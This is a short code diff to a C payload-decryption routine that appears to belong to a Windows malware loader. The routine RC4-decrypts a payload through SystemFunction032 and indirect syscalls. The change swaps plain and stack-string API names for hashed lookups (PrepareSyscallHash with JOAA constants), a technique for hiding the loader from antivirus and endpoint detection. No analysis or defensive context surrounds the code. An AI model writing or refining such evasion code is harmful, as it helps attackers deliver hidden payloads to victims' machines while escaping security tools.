@@ -46,7 +46,7 @@ BOOL Rc4DecryptStandAlone(
         PBYTE decrypted = NULL;
 
         // Allocate memory for the decrypted data using syscalls
-        NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscall((char[]){'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0'});        
+        NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscallHash(NtAllocateVirtualMemory_JOAA);        
         if (!pNtAllocateVirtualMemory) {
                 DebugPrint("[-] Failed to prepare syscall for NtAllocateVirtualMemory.\n");
                 return -2; // Error code
@@ -65,14 +65,14 @@ BOOL Rc4DecryptStandAlone(
         // Copy the payload data into allocated memory
         memcpy(decrypted, pPayloadData, sPayloadSize);
 
-        NtFreeVirtualMemory_t pNtFreeVirtualMemory = (NtFreeVirtualMemory_t)PrepareSyscall((char[]){'N','t','F','r','e','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0'});
+        NtFreeVirtualMemory_t pNtFreeVirtualMemory = (NtFreeVirtualMemory_t)PrepareSyscallHash(NtFreeVirtualMemory_JOAA);
         if (!pNtFreeVirtualMemory) {
                 DebugPrint("[-] Failed to prepare syscall for NtFreeVirtualMemory.\n");
                 return -2; // Error code
         }
         
         // Resolve SystemFunction032 via indirect syscall
-        fnSystemFunction032 pSystemFunction032 = (fnSystemFunction032)PrepareSyscall("SystemFunction032");
+        fnSystemFunction032 pSystemFunction032 = (fnSystemFunction032)PrepareSyscallHash(SystemFunction032_JOAA);
         if (!pSystemFunction032) {
                 DebugPrint("[-] Failed to prepare syscall for SystemFunction032.\n");
                 pNtFreeVirtualMemory(GetCurrentProcess(), (PVOID*)&decrypted, &regionSize, MEM_RELEASE);
